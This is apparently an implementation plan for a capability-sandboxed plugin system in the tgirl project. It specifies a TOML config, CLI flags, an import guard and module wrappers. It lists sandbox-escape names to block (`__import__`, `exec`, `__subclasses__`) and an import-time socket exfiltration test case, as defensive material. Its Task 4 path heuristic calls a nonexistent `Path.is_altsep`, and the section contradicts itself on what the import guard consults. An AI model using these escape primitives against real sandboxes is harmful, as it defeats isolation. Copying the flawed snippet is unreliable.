# PRP: Plugin Architecture

## Source PRD: docs/PRDs/plugin-architecture.md
## Date: 2026-04-23

## 1. Context Summary

Formalize tgirl's internal `@registry.tool()` pattern into a public plugin API with a capability-based trust model. Three tiers (stdlib / user-default / user-with-grants), seven named capabilities (`filesystem-read`, `filesystem-write`, `network`, `subprocess`, `env`, `clock`, `random`), two-key opt-in (server `--allow-capabilities` flag + per-plugin `allow = [...]` in TOML). No runtime API breaks — the existing `@tool()` decorator continues to work; plugins are Python modules that call it. Sandbox in `compile.py` gains a capability-conditional relaxation knob; other modules (`registry.py`, `grammar.py`, `instructions.py`) unchanged.

Load-bearing downstream: this is the substrate for `stdlib-v1` (bundled functions) and `inline-hy-executor` (the v0.2 launch marquee). The in-flight `inference-irq-controller` is an orthogonal dependency — plugin architecture does NOT require IRQ controller to ship first.

## 2. Codebase Analysis

### Existing tool-registration surface

- `src/tgirl/registry.py:88` — `class ToolRegistry` with `_tools: dict[str, ToolDefinition]` and `_callables: dict[str, Callable]`.
- `src/tgirl/registry.py:101` — `tool(*, quota, cost, scope, timeout, cacheable, description)` decorator. Type-annotated params; extracts parameters via `extract_parameters`; raises on duplicate registration.
- `src/tgirl/registry.py:174` — `register_from_schema(name, parameters, ...)` for JSON-schema-driven (non-decorator) registration.
- `src/tgirl/registry.py:255` — `snapshot(restrict_to, scope)` produces immutable `RegistrySnapshot`. Grammar + instructions regenerate from these.
- `src/tgirl/registry.py:316` — `register_type(tag, grammar_rule)` for custom type grammars.

### Existing tool-loading mechanism (`--tools <path>`)

- `src/tgirl/cli.py:20` — `load_tools_from_path(path, registry)` enters per path.
- `src/tgirl/cli.py:51` — `_load_single_module(file_path, registry)` uses `importlib.util.spec_from_file_location` and `spec.loader.exec_module(module)` to import the user's Python file at full CPython privilege. **Module import is NOT currently sandboxed.** A plugin top-level statements run with full filesystem/network/subprocess access today — a pre-existing risk this PRP inherits. Addressed in Task 4.
- `src/tgirl/cli.py:63` — Strategy 1: module exports `register(registry)` callable; tgirl calls it.
- `src/tgirl/cli.py:74` — Strategy 2: module exports a module-level `registry: ToolRegistry`; tgirl merges its tools.
- `src/tgirl/cli.py:120` — `--tools` click option, multiple allowed. Feeds into `load_tools_from_path` at line 202.

### Existing sandbox (`compile.py`) — Sandbox A

There are TWO distinct sandboxes in this PRP; they must be kept separate.

**Sandbox A** (exists today) — the LLM-generated Hy bytecode execution environment:

- `src/tgirl/compile.py:439` — `class _TgirlNodeTransformer(RestrictingNodeTransformer)` with `# type: ignore[misc]` for RestrictedPython missing stubs. Current constructor signature: `_TgirlNodeTransformer(errors, warnings, used_names)` (see call site at line 522).
- Rejects: `Import` (line 449), `ImportFrom` (457), `Global` (465), `Nonlocal` (473), dunder attribute access (495).
- Allows: `_hy_*` identifiers (482), **non-dunder attribute access WITHOUT `_getattr_` wrapping** (`visit_Attribute`, lines 495–509). This is load-bearing for the `os` capability issue below: attribute-level gating is NOT available in Sandbox A, so granting a module implicitly grants every non-dunder attribute of that module.
- `src/tgirl/compile.py:512` — `_analyze_python_ast(tree, tool_names)` — the RestrictedPython analysis pass; instantiates `_TgirlNodeTransformer` at line 522.
- `src/tgirl/compile.py:603` — `_build_sandbox(registry) -> dict[str, Any]` — assembles the per-call sandbox namespace. **Sandbox A `__builtins__` is EXACTLY 14 names** (lines 626–641): `Exception, True, False, None, isinstance, len, list, dict, int, float, str, bool, tuple, range`. **`open`, `compile`, `eval`, `__import__`, `getattr` are NOT present.** Bytecode runs with this dict as its builtins.
- `src/tgirl/compile.py:703` — `run_pipeline(source, registry, config: CompileConfig | None)` — the public pipeline entry point; stages 1–8 (parse → expand → Hy AST analysis → Python AST analysis → result-capture → compile → build sandbox → execute).
- `src/tgirl/compile.py:800` — the sandboxed bytecode execution site inside `_execute()` where compiled user code runs.

**Sandbox B** (does NOT exist yet — proposed in Task 4) — the plugin-module import-time environment. Its builtins, import hooks, and AST gate are specified in Task 4. **Sandbox A and Sandbox B have orthogonal builtin sets. Do NOT conflate them.** (Historical PRP drafts did conflate them — corrected in Y#2.)

### Request-path integration

- `src/tgirl/serve.py:628` — `_filter_registry(restrict_tools)` already uses snapshot filtering. Plugin-loaded tools flow through this naturally.
- `src/tgirl/serve.py:492, 520, 628` — `restrict_tools: list[str] | None` is in the `/generate` request body. Plugin-registered tools appear by name; no special-casing.

### Tests to reuse

- `tests/test_registry.py` — existing `@tool()` decorator tests; extend to cover plugin-sourced tools.
- `tests/test_compile.py` — sandbox rejection tests; adapt as templates for capability-conditional variants.
- `tests/test_cli.py` — existing `--tools <path>` patterns.
- `tests/test_serve.py` — end-to-end server tests; add plugin-load smoke test.

### Conventions (CLAUDE.md)

- TDD mandatory: RED → GREEN → REFACTOR → COMMIT per task.
- `compile.py` is on the strongly-recommended-for-security-audit list. Any capability-relaxation change requires `/security-audit-team` before PR.
- No "fix later" shims. No cross-framework conversions. No Python-fu on tensor data.
- `# type: ignore` budget: keep narrow, [rule] specifiers mandatory.
- Conventional Commits; commit footer `mypy: X → Y (delta)` per established hygiene.

### Known gotchas relevant to this PRP

- `tomllib` is Python 3.11+. Current `pyproject.toml` targets 3.11; no new external dependency.
- RestrictedPython stubs are missing (`[misc]` ignore at compile.py:439 is stub-gap, structurally necessary).
- Methodology enforcement hooks (`.claude/hooks/block-solo-implementation.sh`) will block direct src/ edits on this branch — use `/execute-team` per tier.

## 3. Implementation Plan

**Test Command:** `pytest tests/`

Each task below is scoped to a single atomic commit following RED → GREEN → REFACTOR discipline. Commit footer MUST include `mypy: X → Y (delta)` — mypy should stay at 0 errors throughout (baseline after PR #24 merge).

### Task dependency DAG

- Task 1 (plugins package + types) blocks everything
- Task 2 (TOML config) depends on Task 1
- Task 3 (CLI flags) depends on Task 1 + 2
- Task 4 (loader in zero-cap mode) depends on Task 1 + 2
- Task 5 (sandbox capability knob) depends on Task 1; independent of 2-4
- Task 6 (capability-to-sandbox mapping) depends on Task 1 + 5
- Task 7 (per-capability integration + Hypothesis) depends on Task 6
- Task 8 (stdlib pack scaffolding) depends on Task 1 + 4
- Task 9 (two-key opt-in gate) depends on Task 3 + 6
- Task 10 (collision handling / namespacing) depends on Task 1 + 4
- Task 11 (serve.py integration) depends on Task 4 + 9
- Task 12 (end-to-end integration) depends on Task 1 + 11
- Task 13 (docs) depends on all above
- Task 14 (final validation + smoke test) depends on all

Recommended execution order: 1 → 2 → 3 → 4 → 10 → 5 → 6 → 7 → 8 → 9 → 11 → 12 → 13 → 14. Tasks 5–7 form the security-critical sandbox cluster; a `/security-audit-team` after Task 7 is advisable before wiring it to the server in Tasks 9 + 11.

---

### Task 1: Plugin package scaffolding + core types

**Files:**
- NEW `src/tgirl/plugins/__init__.py` — public-API exports
- NEW `src/tgirl/plugins/types.py` — `Capability`, `PluginManifest`, `CapabilityGrant` dataclasses
- NEW `tests/test_plugins_types.py`

**Approach:**
- `Capability(str, Enum)` with seven members: `FILESYSTEM_READ`, `FILESYSTEM_WRITE`, `NETWORK`, `SUBPROCESS`, `ENV`, `CLOCK`, `RANDOM`. String values are hyphenated (`"filesystem-read"`) — user-facing config uses hyphens.
- `PluginManifest(name: str, module: str, kind: Literal["module", "file", "auto"] = "auto", allow: frozenset[Capability], source_path: Path | None)` — frozen dataclass. `kind` resolves cross-platform ambiguity per Y12: `"module"` forces dotted-import semantics, `"file"` forces file-path semantics, `"auto"` uses the detection heuristic defined in Task 4.
- `CapabilityGrant(capabilities: frozenset[Capability])` with `@classmethod zero()` returning `{CLOCK, RANDOM}` (the default-granted two).
- Public exports in `src/tgirl/plugins/__init__.py`: `Capability`, `PluginManifest`, `CapabilityGrant`. Do NOT export from `tgirl.__init__` yet (defer to Task 13 when the public API surface is documented).
- No imports of sandbox/registry internals here — pure data.

**Tests (RED first):**
- `test_capability_enum_values` — hyphenated string values, exactly 7 members.
- `test_plugin_manifest_frozen` — mutation attempts raise.
- `test_capability_grant_zero_contains_clock_and_random` — canonical baseline.
- `test_capability_grant_frozenset_invariant` — cannot be accidentally mutated post-construction.

**Validation:** `pytest tests/test_plugins_types.py -v && mypy src/tgirl/plugins/`

**Commit:** `feat(plugins): scaffold package with Capability, PluginManifest, CapabilityGrant`

---

### Task 2: TOML config parser

**Files:**
- NEW `src/tgirl/plugins/config.py`
- NEW `tests/test_plugins_config.py`
- NEW `tests/fixtures/plugin_configs/` — small TOML fixtures

**Approach:**
- `load_plugin_config(path: Path) -> list[PluginManifest]` — uses `tomllib` (stdlib, 3.11+).
- Schema: top-level `[plugins.<name>]` sections. Fields per section: `module: str` (optional — defaults to `tgirl.plugins.stdlib.<name>`), `allow: list[str]` (optional — default `[]`), `enabled: bool` (optional — default `true`).
- Unknown top-level keys → warning logged via structlog, not an error (forward compat).
- Unknown `allow` capability → `InvalidPluginConfigError` with the unknown name. Fast fail.
- Unknown per-plugin key → same error (strict).
- Returns `list[PluginManifest]` in file-declared order (use `tomllib` ordered-dict semantics; fallback: sort by name for determinism if needed).
- Config-file search order (CLI override > explicit path > `tgirl.toml` at repo root > none). This task implements the parser; discovery order lives in Task 3.
- Log each loaded manifest at `info` level for auditability.

**Tests (RED first):**
- `test_load_valid_config_one_plugin` — TOML with `[plugins.math]` (no `allow`), returns one-element list with zero allow-set.
- `test_load_valid_config_multi_plugin_ordered` — three plugins, file order preserved.
- `test_load_unknown_capability_raises` — `allow = ["banana"]` fast-fails.
- `test_load_unknown_plugin_key_raises` — `[plugins.x] foo = "bar"` fast-fails.
- `test_load_unknown_top_level_key_warns_but_succeeds` — forward compat case.
- `test_load_disabled_plugin_excluded` — `enabled = false` plugins omitted from return value.
- `test_load_missing_file_raises` — `FileNotFoundError`.
- `test_load_malformed_toml_raises` — `tomllib.TOMLDecodeError` propagates.

**Validation:** `pytest tests/test_plugins_config.py -v && mypy src/tgirl/plugins/`

**Commit:** `feat(plugins): TOML config parser with capability/key strict validation`

---

### Task 3: CLI flags for plugin + capability opt-in

**Files:**
- `src/tgirl/cli.py` — add `--plugin`, `--plugin-config`, `--allow-capabilities` options
- `tests/test_cli.py` — extend

**Approach:**
- `--plugin <name>` — repeatable; shorthand for `[plugins.<name>]` with no capabilities (stdlib or unconfigured user plugins). Accumulates into a `tuple[str, ...]`.
- `--plugin-config <path>` — explicit TOML config path. Overrides automatic discovery.
- `--allow-capabilities` — boolean flag. When absent, no capability grants are honored at runtime (regardless of TOML config). When present, per-plugin `allow = [...]` is respected.
- Config discovery (only when `--plugin-config` not given): `$CWD/tgirl.toml` exists → use it; else no config file (CLI flags alone).
- Merge semantics: plugins declared via `--plugin` are added to the config-loaded list. Duplicate names → fail-fast with pointed error ("plugin X declared twice in CLI + config").
- **Make `--tools` optional (resolved per Y#5).** Today `src/tgirl/cli.py:119-124` has `required=True, multiple=True` on `--tools`, which means `tgirl serve --plugin math` (no `--tools`) exits with a click UsageError. Task 3 must relax this:
  - Change `--tools` to `required=False, multiple=True, default=()`.
  - Add a CLI validation rule at the top of `serve_cmd`: assert that at least one of `--tools`, `--plugin`, `--plugin-config`, or an auto-discovered `$CWD/tgirl.toml` is present. If all four are absent AND stdlib-autoload is disabled by the (currently empty) config, fail-fast with a pointed error listing the four sources. If stdlib-autoload is on (the default — per Task 11 §394), an empty invocation is permitted because stdlib will load.
  - AC#7 regression coverage ("no regression on `--tools`") is necessary but not sufficient — Task 3 also ships a positive-case test for plugin-only invocation without `--tools` (see test list below). This unblocks the Task 14 smoke test command `tgirl serve --model ... --plugin math`.
- Do NOT load plugins in this task — just capture and propagate intent. Loading is Task 4.
- Wire the parsed list (`list[PluginManifest]`) and the `allow_capabilities: bool` flag into the existing `ctx.registry` setup path, stashing on `ctx.plugin_manifests` and `ctx.allow_capabilities` (or equivalent).

**Tests (RED first):**
- `test_cli_plugin_flag_captured_as_zero_capability_manifest` — `--plugin math` results in a manifest with `allow=frozenset()`.
- `test_cli_plugin_config_path_loads_toml` — `--plugin-config path.toml` loads correctly.
- `test_cli_both_sources_duplicate_name_fails` — duplicate detection across CLI + config.
- `test_cli_allow_capabilities_flag_default_false` — without the flag, `allow_capabilities` is False in ctx.
- `test_cli_allow_capabilities_flag_sets_true` — with the flag, it True.
- `test_cli_auto_discover_tgirl_toml` — if `$CWD/tgirl.toml` exists and no `--plugin-config`, auto-load it.
- `test_cli_plugin_only_invocation_without_tools_succeeds` — `tgirl serve --model <m> --plugin math` (no `--tools`) parses cleanly. Today this exits 2 with "Missing option '--tools'"; after Task 3 it must succeed. This is the positive case Y#5 required.
- `test_cli_no_plugin_no_tools_no_config_fails_with_helpful_error` — when stdlib-autoload is off AND no sources declared, fail-fast with a pointed error listing all four sources (`--tools`, `--plugin`, `--plugin-config`, `tgirl.toml`).
- `test_cli_tools_only_invocation_still_works_regression` — existing `tgirl serve --tools some_module` invocations unchanged (AC#7).

**Validation:** `pytest tests/test_cli.py -v && mypy src/`

**Commit:** `feat(cli): --plugin, --plugin-config, --allow-capabilities flags`

---

### Task 4: Plugin loader in zero-capability mode

**Files:**
- NEW `src/tgirl/plugins/loader.py`
- `src/tgirl/cli.py` — integrate loader in place of (or alongside) existing `load_tools_from_path`
- NEW `tests/test_plugins_loader.py`

**Approach:**
- `load_plugin(manifest: PluginManifest, registry: ToolRegistry, grant: CapabilityGrant) -> None`.
- For v1 (this task), `grant` is always `CapabilityGrant.zero()` in the loader signature. The two-key opt-in that can raise the grant is Task 9.
- Module discovery (cross-platform robust per Y12):
  - If `manifest.kind == "file"`: always use `importlib.util.spec_from_file_location(...)`.
  - If `manifest.kind == "module"`: always use `importlib.import_module(...)`.
  - If `manifest.kind == "auto"` (default): apply the detection heuristic:
    ```python
    p = Path(manifest.module)
    is_file_path = (
        p.suffix == ".py"
        or os.sep in manifest.module
        or p.is_absolute()
        or (p.is_altsep is not None and p.is_altsep in manifest.module)
        or manifest.source_path is not None
    )
    ```
    The heuristic handles POSIX `/path/x.py`, Windows `C:\path\x.py`, Windows `plugins\x.py`, and ambiguous dotted names (`my.plugin.module` → treated as module). If detection is wrong, users set `kind` explicitly.
  - Windows bare-path case (`C:\plugins\my_plugin` with no `.py` and no extension) — `p.is_absolute()` catches it. Windows relative path without extension (`plugins\my_plugin`) — `os.sep in manifest.module` catches it on Windows, not on POSIX. Documented limitation: on POSIX, a bare name with backslashes is ambiguous; users set `kind = "file"` explicitly.
  - Task 12 adds a smoke test per platform: POSIX-absolute, POSIX-relative, Windows-absolute, Windows-relative, and dotted-module.

**Three-gate capability model — option (iii) per Y#6-followup: full separation of declaration vs enforcement.**

PRD AC#3 + AC#4 + §5 "Private-plugin exfil risk" require THREE distinct gates, and `manifest.allow` MUST NOT influence runtime behavior — it is consulted ONLY by the static AST scan. All runtime machinery consults `effective_grant`. This is the cleanest separation of concerns per Y#6-followup option (iii) and closes the import-time exfil vector.

**Gate 1 — Static AST author-hygiene scan (uses `manifest.allow` EXCLUSIVELY; zero runtime influence).**
- At plugin registration (BEFORE any plugin Python executes), walk the full module AST — top-level AND every function body AND every class body — with `ast.walk`.
- Collect every `Import`, `ImportFrom`, dynamic-import marker (`__import__`, `importlib`, `importlib.import_module`), and forbidden name references (`exec`, `eval`, `compile`, `getattr` + dunder string literal, `__builtins__`, `__class__`, `__mro__`, `__subclasses__`, `__base__`, `__bases__`).
- Each import target must be covered by `manifest.allow` (plus always-available CLOCK/RANDOM defaults). Under-declared imports → `PluginASTRejectedError` at load with pointed `"plugin X imports Y; declare 'cap_Z' in manifest.allow"`.
- Runs every time, regardless of `--allow-capabilities`. This is static lint.
- **Key property: gate 1 never authorizes anything — it only validates that the plugin author declared what the module claims.** Decisions about whether those imports actually get to DO anything happen at gate 3.

**Gate 2 — `sys.meta_path` finder (materializes modules; does NOT authorize).**
- When a plugin's static `import X` executes, the meta_path finder intercepts.
- The finder's single job: if X is a capability-mapped module, wrap the returned module object in `CapabilityScopedModule(real_module, capability=C)`. Otherwise pass through unchanged (for non-capability modules like `collections` or bundled pure-Python code).
- The finder does NOT consult `manifest.allow` — gate 1 already validated the static import set. The finder does NOT consult `effective_grant` either — authorization is deferred to gate 3 (the wrapper).
- Phase A (during plugin module import): finder installed.
- Phase B (during tool-call dispatch via `ToolRegistry.get_callable(name)` wrapper): finder installed with `effective_grant` set in `_guard` contextvar; catches tool-body code that calls wrapped-module methods at runtime.

**Gate 3 — `CapabilityScopedModule` wrapper (uses `effective_grant` EXCLUSIVELY).**
- `CapabilityScopedModule(real_module, capability)` is a `ModuleType`-compatible wrapper. Its `__getattribute__` intercepts every attribute access:
  - Reads the current `effective_grant` from the `_guard` contextvar.
  - If the wrapped module's capability is in `effective_grant`: transparent passthrough to the real attribute.
  - If NOT in `effective_grant`:
    - Data attributes (non-callable, e.g. `socket.AF_INET` which is an `int`) pass through unchanged — they cannot perform operations.
    - Callable attributes return a `_CapabilityDeniedCallable` sentinel that raises `CapabilityDeniedError` when INVOKED (not when merely accessed). This means passing `socket.socket` as a reference is fine; calling it isn't. Rationale: references alone cannot exfil; calls can.
- The contextvar design means a grant change mid-session is honored by every subsequent call — supports any future hot-reload story.
- For the four tgirl proxy modules (`env_proxy`, `subprocess_proxy`, `fs_read_proxy`, `fs_write_proxy`), wrapping is redundant (their surface is already the intended one) — the finder returns them unwrapped as a perf optimization.

**Why option (iii) and not (ii):**
- Option (ii) (my prior revision) had the meta_path guard consult `manifest.allow` at Phase A — introducing a second source of truth for "is this import allowed." Option (iii) has ONE source of truth: the static AST scan consults `manifest.allow`; everything runtime-facing consults `effective_grant`. Cleaner, less coupled, and equivalent in security properties because the AST scan walks the entire module (not just top-level).

**Behavioral walkthrough:**

| Scenario | manifest.allow | --allow-capabilities | effective_grant | `import socket` | top-level `socket.socket()` | call-time `socket.socket()` |
|---|---|---|---|---|---|---|
| Under-declared | `[]` | any | zero | **rejected at load** (gate 1 static AST scan — AC#3) | n/a | n/a |
| Declared + revoked | `["network"]` | off | zero | ok (gate 1 passes; gate 2 finder returns `CapabilityScopedModule(socket, NETWORK)`) | **raises** (gate 3 wrapper checks `effective_grant`, NETWORK absent) — closes PRD §5 exfil | **raises** (gate 3 wrapper, same mechanism) — matches AC#4 |
| Declared + granted | `["network"]` | on | `{NETWORK}` | ok (gate 1 passes; gate 2 wraps; gate 3 transparent) | ok | ok |
| Lazy import inside function body (under-declared) | `[]` | any | zero | static AST walks into function bodies → **rejected at load** (gate 1 — comprehensive scan, not just top-level) | n/a | n/a |
| Lazy import inside function body (declared + revoked) | `["network"]` | off | zero | gate 1 passes (declared); gate 2 wraps at call time when lazy `import` executes | n/a | **raises** on first call that triggers lazy `import socket` (gate 3 wrapper) |

This three-gate model:
- **Preserves AC#3** — author under-declaration caught at load by gate 1's full-tree AST walk.
- **Preserves AC#4** — declared-but-revoked plugins load successfully but fail at actual use (gate 3).
- **Closes PRD §5 exfil risk** — import-time usage of a revoked capability raises via gate 3 because the module returned is a wrapper, not the raw module.

**Implementation note**: `CapabilityScopedModule` is a class in `src/tgirl/plugins/loader.py`. Task 4 ships it. Task 7 adversarial tests MUST include "plugin declares `network`, server revokes, plugin top-level tries `socket.create_connection(...)`, assert `CapabilityDeniedError` fires at load" (this is the new Y#6-followup test).

Alternative models considered and rejected:
- Option (B) "both gates use `grant`" — would break AC#3's author-hygiene property (a plugin with `allow=[]` + top-level `import socket` would fail with a grant-message, not a declaration-message).
- Option (C) "import always zero, call uses `grant`" — would break AC#4 when a plugin with `allow=["network"]` has top-level `import socket`.
- Original option (A) (two-gate only, no wrapping) — closes AC#3/AC#4 but fails PRD §5 exfil risk per Y#6-followup.

Only three-gate-with-module-wrapping satisfies all three constraints. Flagging PRD language as ambiguous — recommend PRD update in parallel or accept this PRP's interpretation as canonical (see Uncertainty Log).

**Sandbox B — plugin-import environment (NEW, must be specified from scratch):**

Sandbox B is NOT Sandbox A. Sandbox A runs LLM-generated Hy with 14 safe builtins. Sandbox B runs a real Python module at import time; it needs far more builtins than Sandbox A just to let a normal `@tool()`-decorated module load. The design question is: *which* builtins, and which are capability-gated.

1. **AST pre-parse gate** (runs before any code executes):
   - Parse the plugin source file with `ast.parse`.
   - Reuse a refactored variant of `_TgirlNodeTransformer`, but with the `grant`-aware `visit_Import` / `visit_ImportFrom` checks from Task 5/6.
   - Reject dunder attribute access (same rule as Sandbox A `visit_Attribute` at line 495).
   - Reject `exec`, `eval`, `compile`, `__import__`, `globals`, `locals`, `vars`, `getattr`/`setattr`/`delattr` name references — these are pre-runtime defeat-in-depth against dynamic-import defeat. (Task 7 adversarial cases pin this.)
   - Pre-parse rejects violations at parse time before ANY top-level statement runs.

2. **`sys.meta_path` import guard — dual-phase: import + call** (resolved per Y11):
   - A `MetaPathFinder` persistently installed for the tgirl process lifetime, scoped via `contextvars.ContextVar[CapabilityGrant | None]` (`_guard`).
   - The guard consults the contextvar; if set, it checks the target module against the grant's module set and raises `CapabilityDeniedError` on mismatch. If unset (contextvar is `None`), the guard is a no-op — tgirl's own imports pass through.
   - **Phase A — during plugin module import**: wrap the plugin import in `token = _guard.set(manifest.allow); try: ...; finally: _guard.reset(token)`. Catches lazy imports triggered by top-level plugin code.
   - **Phase B — during plugin tool-call execution**: wrap EACH tool-call invocation through the registry in the same contextvar pattern, setting `_guard` to `effective_grant` (not `manifest.allow` — runtime uses the grant, per Y6). Catches the Y11 attack: a plugin function body that calls `__builtins__.__import__('socket')` or `importlib.import_module('socket')` at runtime.
   - The registry's call dispatch is the enforcement point: `ToolRegistry.get_callable(name)` returns a wrapped callable that sets/resets the contextvar around the underlying invocation.
   - Rationale: the bare contextvar approach from the earlier PRP draft only covered Phase A. Phase B is load-bearing for the two-key model — without it, a zero-grant plugin can still do `__import__("socket")` inside a tool function and defeat the gate.

2b. **Register-time AST re-check on function bodies (new, resolved per Y11)**:
   - At `@tool()`-registration time (inside `load_plugin`, after import succeeds, before `registry.register`), walk each decorated function's `co_code` / AST for suspicious name references: `importlib`, `__import__`, `exec`, `eval`, `compile`, `globals`, `locals`, `vars`, `getattr`, `setattr`, `delattr`, `__builtins__`, `__loader__`, `__spec__`.
   - If the function body references any of these AT ALL, require the plugin to declare an "eval" capability — which is NOT in the v1 capability set (deliberate: v1 does not permit this class of plugin).
   - Defense-in-depth: combined with Phase B above, a plugin cannot (a) statically reference `__import__` in its function body without the AST gate catching it, (b) dynamically call `__import__` via runtime name resolution because the meta_path guard fires, (c) bypass either by stashing a reference at import time because `__builtins__` itself is name-blocked by the AST gate.
   - The check reuses `ast.walk` — no new dependency. Runs inside `load_plugin`'s post-import phase; fail-fast raises `PluginASTRejectedError` with the specific function and offending name.

3. **Sandbox B safe-builtins contract** (the exec-globals passed when the module loads):
   - Start from full `builtins` and REMOVE: `exec`, `eval`, `compile`, `__import__`, `open` (for zero-cap; see below), `breakpoint`, `input`.
   - **Capability-conditional builtins:**
     - `open` is absent at zero grant; added to `__builtins__` when EITHER `FILESYSTEM_READ` or `FILESYSTEM_WRITE` is in the grant. When `FILESYSTEM_READ` is granted but not `FILESYSTEM_WRITE`, wrap `open` to reject `"w"`/`"a"`/`"x"`/`"+"` modes (raise `CapabilityDeniedError`). This settles the Uncertainty Log item on `open` for Sandbox B (Uncertainty Log entry rewritten accordingly).
     - `__import__` remains absent at ALL grant levels — normal `import` statements go through the `sys.meta_path` guard, and the `__import__` name reference is already blocked by the AST pre-parse.
   - The stdlib plugins (Task 8) MUST load cleanly with the zero-grant safe-builtins set — their test battery is the ground-truth for what "normal" plugin code requires.

4. **After import succeeds**, call either `module.register(registry)` (Strategy 1) or merge `module.registry` (Strategy 2) — same two strategies as `cli.load_tools_from_path`.

- New error type: `CapabilityDeniedError` with structured fields (`capability: Capability`, `caller: str`, `remediation_hint: str`).
- `load_plugin` does NOT call any registered tool function — just imports + registers. Call-time capability enforcement is Task 5/6.

**Tests (RED first):**
- `test_load_stdlib_math_plugin_in_zero_capability_mode_succeeds` — stub stdlib plugin (no I/O) loads cleanly.
- `test_load_plugin_that_imports_socket_at_toplevel_raises_capability_denied` — parametrize over `socket`, `subprocess`, `os.path`-that-reads-filesystem.
- `test_load_plugin_from_file_path_works` — same fixture as existing `tests/test_cli.py` path-based load.
- `test_load_plugin_from_importable_module_name_works` — via `importlib.import_module`.
- `test_load_plugin_with_register_fn` — Strategy 1 continues to work.
- `test_load_plugin_with_registry_var` — Strategy 2 continues to work.
- `test_load_plugin_duplicate_tool_name_raises` — existing ToolRegistry duplicate detection surfaces correctly.
- `test_load_plugin_module_not_found_raises_pluginloaderror` — not a bare ImportError.
- **Regression:** existing `tests/test_cli.py::test_load_tools_from_path_*` tests continue to pass unchanged (the old `--tools <path>` code path still works; it functionally a zero-capability plugin load).

**Validation:** `pytest tests/test_plugins_loader.py tests/test_cli.py -v && mypy src/`

**Commit:** `feat(plugins): sandboxed loader + CapabilityDeniedError at import time`

---

### Task 5: Sandbox capability-relaxation knob in compile.py

**Files:**
- `src/tgirl/compile.py` — extend `_TgirlNodeTransformer` + call-site plumbing
- `tests/test_compile.py` — extend with capability-specific cases

**Approach:**
- Add a `grant: CapabilityGrant` keyword parameter to `_TgirlNodeTransformer.__init__` (currently `(errors, warnings, used_names)` per call site at `compile.py:522`). Default: `CapabilityGrant.zero()` for backward compatibility.
- `visit_Import` (line 449) and `visit_ImportFrom` (457) become capability-conditional: if the imported module is in the allowed-module-list for *any* granted capability, permit; else reject as today.
- Allowed-module list is keyed off the capability mapping (defined in Task 6). For Task 5, stub the mapping as an empty dict → no capability unlocks any import → existing behavior preserved at the default.
- Plumbing path — propagate `grant` through the real call graph:
  1. Add `grant: CapabilityGrant | None = None` as a new field on the existing `CompileConfig` dataclass (the `config` parameter of `run_pipeline` at `compile.py:703`). `None` → `CapabilityGrant.zero()`.
  2. `run_pipeline` extracts `grant` from `cfg` and forwards it to `_analyze_python_ast(py_tree, tool_names, grant)` at `compile.py:766`. Extend `_analyze_python_ast`'s signature accordingly.
  3. `_analyze_python_ast` forwards `grant` to `_TgirlNodeTransformer(...)` at `compile.py:522`.
  4. Also forward `grant` to `_build_sandbox(registry, grant)` at `compile.py:785` — Task 6 uses this for capability-conditional safe-builtins (e.g., the `open` builtin on `FILESYSTEM_*` grants). For Task 5, `_build_sandbox` just accepts-and-ignores the kwarg; Task 6 wires it in.
- NOTE: there is no `compile_restricted` function in tgirl — that is RestrictedPython's library function, not ours. The tgirl public pipeline entry is `run_pipeline`.
- Do NOT wire to the server side yet (Task 11) — `run_pipeline` callers in `serve.py` / `rerank.py` keep passing `config=None`, which resolves to zero grant.

**Task 5 → Task 6 explicit contract (resolved per Y10's concern about empty-mapping shim):**
Task 5 is NOT a no-op commit with an empty mapping. Task 5 ships a real, partial capability mapping — specifically the two DEFAULT-granted capabilities: `CAPABILITY_MODULES[CLOCK] = {"time", "datetime", "calendar"}` and `CAPABILITY_MODULES[RANDOM] = {"random", "secrets", "uuid"}`. With these in Task 5, its tests observe a real behavior delta: zero-grant sandbox permits `import time` (via CLOCK default), rejects `import socket`, and the `CapabilityGrant({NETWORK})` test case rejects `socket` because Task 5 hasn't added NETWORK mapping yet.

Task 6 extends `CAPABILITY_MODULES` with the remaining 5 capabilities (FILESYSTEM_READ, FILESYSTEM_WRITE, NETWORK, SUBPROCESS, ENV) PLUS the proxy modules (`env_proxy`, `subprocess_proxy`) PLUS the `open`-builtin capability-conditional wrapper in `_build_sandbox`.

Split rationale: Task 5 is **mapping infrastructure + default capabilities** (low-risk, no new modules). Task 6 is **security-critical capability mappings + proxy modules** (the cluster that warrants `/security-audit-team` per §3 execution order). Both commits are behaviorally observable; neither is a shim.

**Tests (RED first):**
- `test_sandbox_zero_grant_still_rejects_network_imports` — regression: `import socket` still rejected at default grant.
- `test_run_pipeline_accepts_grant_via_compile_config` — API surface smoke: `run_pipeline(source, registry, CompileConfig(grant=CapabilityGrant.zero()))` executes end-to-end.
- `test_analyze_python_ast_accepts_grant_kwarg` — the internal pass accepts + forwards the grant.
- `test_build_sandbox_accepts_grant_kwarg` — Task 5 shape-only for `_build_sandbox`; Task 6 supplies the `open`-builtin behavior.
- `test_zero_grant_permits_clock_module_import` — CLOCK default grant means `import time` is permitted at zero grant. Real behavior delta for Task 5.
- `test_zero_grant_permits_random_module_import` — RANDOM default grant means `import random` is permitted at zero grant.
- `test_explicit_network_grant_rejects_socket_at_task5_level` — Task 5 has not added NETWORK mapping; even `CapabilityGrant({NETWORK})` rejects `import socket`. Task 6 makes this flip; the test documents the Task 5 → Task 6 behavioral delta.
- `test_sandbox_grant_cannot_exceed_declared_capabilities` — shape check: any module not in the grant's union-of-capability module sets is rejected.

**Validation:** `pytest tests/test_compile.py -v && mypy src/tgirl/compile.py`

**Commit:** `feat(compile): capability-conditional sandbox relaxation knob`

---

### Task 6: Capability-to-module mapping

**Files:**
- NEW `src/tgirl/plugins/capabilities.py` — the mapping
- `src/tgirl/compile.py` — consume the mapping from Task 5 knob
- NEW `tests/test_plugins_capabilities.py`

**Approach:**

**The `os`-module capability-collapse problem (resolved here, per Y#3):**
Sandbox A's `visit_Attribute` at `compile.py:495` allows non-dunder attribute access WITHOUT per-attribute gating. Therefore **granting the raw `os` stdlib module to ANY capability is equivalent to granting full RCE** — `os.<system-call>`, `os.<exec-family>`, `os.fork`, `os.kill`, `os.setuid`, `os.chmod`, `os.chown`, `os.walk`, `os.environ` are all reachable by non-dunder attribute access after `import os`. The capability-isolation claim ("Each capability is INDEPENDENT") fails the moment `os` appears in any capability's module set.

**Decision (resolved — promoted from Uncertainty Log): `os` is BANNED from the `CAPABILITY_MODULES` mapping entirely** (option (c) from Y#3). Filesystem goes through `pathlib`; environment and subprocess access go through tgirl-provided proxy modules that expose only the intended surface.

